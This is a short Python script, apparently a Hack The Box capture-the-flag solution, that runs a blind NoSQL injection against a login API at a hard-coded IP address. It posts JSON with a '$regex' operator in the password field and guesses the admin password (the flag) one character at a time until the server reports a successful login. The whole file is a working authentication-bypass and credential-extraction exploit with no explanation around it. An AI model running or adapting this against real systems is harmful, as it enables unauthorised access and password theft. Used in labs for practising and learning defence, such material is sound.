import requests
import string


u="http://46.101.8.93:30913/api/login"

headers={'content-type': 'application/json'}

flag_list = list("HTB{")

while True:
    for character in string.printable:
        if character not in ['*','+','.','?','|','"','\\']:
            print(f"trying {''.join(flag_list) +character}")
            payload='{"username": {"$eq": "admin"}, "password": {"$regex": "^%s" }}' % ("".join(flag_list) + character)

            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)

            if (r.json()) == {"logged":1,"message":"User authenticated successfully!"}:
                 flag_list.append(character)
                 break

